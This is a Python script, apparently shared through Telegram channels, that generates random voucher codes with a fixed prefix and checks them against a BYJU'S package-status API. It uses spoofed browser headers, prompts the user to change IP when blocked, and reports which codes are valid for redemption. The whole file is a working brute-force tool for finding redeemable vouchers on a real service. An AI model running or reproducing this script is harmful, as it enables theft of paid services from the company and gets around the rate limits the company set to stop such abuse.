import requests
import time
import random
import string

logo = '''
-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-
        ██████╗░ ██╗░░░██╗ ░░░░░██╗ ██╗░░░██╗ ░██████╗
        ██╔══██╗ ╚██╗░██╔╝ ░░░░░██║ ██║░░░██║ ██╔════╝
        ██████╦╝ ░╚████╔╝░ ░░░░░██║ ██║░░░██║ ╚█████╗░
        ██╔══██╗ ░░╚██╔╝░░ ██╗░░██║ ██║░░░██║ ░╚═══██╗
        ██████╦╝ ░░░██║░░░ ╚█████╔╝ ╚██████╔╝ ██████╔╝
        ╚═════╝░ ░░░╚═╝░░░ ░╚════╝░ ░╚═════╝░ ╚═════╝░
-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-
              [+] Made By FullNoob_xD [+]
              [+] Join @ConfigsGram [+]
              [+] For queries/feedbacks, Conact @NoobxD_Robot [+]
-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-
'''

for N, line in enumerate(logo.split("\n")):
    print(line)
    time.sleep(0.04)

def GenCode():

    ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    code = "W01013403F"+str(ran)
    # print(code)
    return code

def checkCode(numOfChecks):
    totExp = 0
    totVal = 0
    for i in range(1, numOfChecks+1):
        hdrs = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://byjus.com/',
            'Content-Type': 'application/json',
            'Origin': 'https://byjus.com',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            # Requests doesn't support trailers
            # 'TE': 'trailers',
        }
        cde = GenCode()
        prms = {
            'id': cde,
        }
        goToUrl = "https://mtnucleus.byjusweb.com/api/mlp/get-package-status/"
        goToUrl2 = requests.get(url=goToUrl, params=prms, headers=hdrs)
        # print(goToUrl2.text)

        if goToUrl2.status_code == 403 or goToUrl2.status_code == 500:
            print("["+str(i)+"] Code =", cde, "| Change IP [+]")

        elif goToUrl2.status_code == 400:
            print("[" + str(i) + "] Code =", cde, "| Invalid [+]")

        elif goToUrl2.status_code == 304:
            if "status\":\"NEW" in goToUrl2.text:
                print("[" + str(i) + "] Code =", cde, "| Valid [+]")
                totVal += 1
            elif "status\":\"REGISTERED" in goToUrl2.text:
                print("[" + str(i) + "] Code =", cde, "| Expired/Already Used [+]")
                totExp += 1
            else: print("["+str(i)+"] Code =", cde, "| Unknown Error [+]")

        else: print("["+str(i)+"] Code =", cde, "| Unknown Error [+]")
    print("-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-")
    print("[+] Link to redeem voucher code = https://byjus.com/mlp/\n[+] Total Valid =", totVal,"\n[+] Total Expired =", totExp)

try:
    nums = int(input("[+] Enter the number of codes to generate and check : "))
    print("[+] Starting generator and checker.....")
    print("-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-")
    checkCode(nums)
    # print("[+] Link to redeem voucher code = https://byjus.com/mlp/")
    input("[+] Process finished successfully! Press any key to exit!")
except Exception as exc:
    print("Pstt!!! Unknown error occured. Try running again or contact owner.\nReason of error: ",exc)
    input("[+] Process finished successfully! Press any key to exit!")